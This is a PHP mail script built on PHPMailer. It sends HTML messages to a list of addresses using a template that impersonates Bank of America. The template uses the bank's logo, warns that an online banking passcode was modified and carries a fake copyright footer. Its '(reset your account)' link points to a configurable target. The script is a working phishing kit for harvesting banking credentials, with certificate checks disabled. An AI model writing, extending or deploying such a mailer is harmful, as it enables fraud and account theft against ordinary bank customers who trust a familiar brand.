
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    require '../vendor/phpmailer/phpmailer/src/PHPMailer.php';
    require '../vendor/phpmailer/phpmailer/src/SMTP.php';
    require '../vendor/phpmailer/phpmailer/src/Exception.php';


    function sendmail($config, $data, $addrList, $theme){
        echo 'sending';
        foreach($addrList as $addr){
            $mail = new PHPMailer;  
            $mail->CharSet =  "utf-8";
            $mail->IsSMTP();
            $mail->SMTPAuth = true;
            $mail->Username = $config['email'];
            $mail->Password = $config['pass'];
            $mail->SMTPSecure = "tsl"; 
            $mail->Host = $config['host'];
            $mail->Port = $config['port'];
            $mail->From = $config['email'];
            $mail->FromName = $config['name'];
            $mail->AddAddress($addr);
            $mail->Subject = $data['header'];
            $mail->IsHTML(true);
            if($theme == 'raw'){
                 $mail->Body =  '<h1 style="text-decoreation: underline;">'.$data["header"].'</h1> <br>'.'<p>'.$data["msg"].'</p>';
            }else{
                // require '../../templates/english/Bank_of_America';
                 $mail->Body = addTheme($data['header'], 'Http://facebook.com' , $data['msg']);
            }
            $mail->SMTPDebug = 3;
            $mail->SMTPOptions = array(
                 'ssl' => array(
                     'verify_peer' => false,
                     'verify_peer_name' => false,
                     'allow_self_signed' => true
                 )
             );
            //sam check
            if($mail->Send()){
                
                echo TRUE;
            }
            else{
                echo "Mail Error - >".$mail->ErrorInfo;
            }
        }

    }

    function addTheme($header, $link, $msg){
        $template = '<!DOCTYPE html>
    <html>
    <head>
        <link href="https://fonts.googleapis.com/css?family=Open+Sans|Sacramento|Ubuntu" rel="stylesheet">
        <link href="https://fonts.googleapis.com/css?family=Architects+Daughter" rel="stylesheet">
    
    </head>
    <style type="text/css">
        body {
            margin: 0;
            padding: 0;
            font-family: "Architects Daughter", sans-serif;
        }
    </style>
    
    <body>
        <table align="center" cellspacing="0" style="max-width: 600px; width: 100%;">
            <tr>
                <td>
                    <!-- header -->
                    <table width="100%" cellspacing="0" border="0" style=" text-align: center; color: white; position: relative; height: 35px">
                        <tr>
                            <td>
                                 <div style="/*! top: 0; */ /*! left: 0; */ /*! float: left; */ padding: 30px; box-sizing : border-box"><img src="http://www.jobsvision.co.in/FLogos/bank-of-america.jpg" style="width: 300px;"></div>
                                <div style="position: relative; top: 90px; left: 10px; font-size: 1.2em; float: left; color: red;">Onlin Banking Passcode Modified</div>
                            </td>
                        </tr>
                    </table>
                    <!-- header end -->
                    <!--content -->
                    <table width="100%" cellspacing="0" border="0" style="">
                        <tr>
                            <td>
                                <p style="color: slategrey; margin: 20px ; font-size: 1.6em ; ">'.$header.'</p>
                                <p style="color: slategrey; margin: 20px">Hello,</p>
                                <p style="color: slategrey; margin: 20px">'.$msg.'</p><br>
                                <p style="color: slategrey; margin: 20px">
                                    There is a link to reset your account
                                    <a style="text-decoration: none;" href="'.$link.'"> <i style="color:rgb(123, 161, 250);">(reset your account)</i></a>
                                </p>   
                            </td>
                        </tr>
                    </table>
                    <!-- content -->
                    <!-- footer -->
                    <table width="100%" cellspacing="0" border="0" style=" color: slategrey; position: relative;">
                        <tr>
                            <td style="height: 35px; padding: 5px; box-sizing: border-box;">
                                <div style="border: 1px solid silver"></div>
                                <p style=" color: slategrey; font-family: "Open Sans"; font-size: 12px; text-align: center;">2017 bank of America Corperation. All Rights Reserved.</p>
                            </td>
                        </tr>
                    </table>
                    <!-- footer -->
                </td>
            </tr>
        </table>
    </html>';
    return $template;
}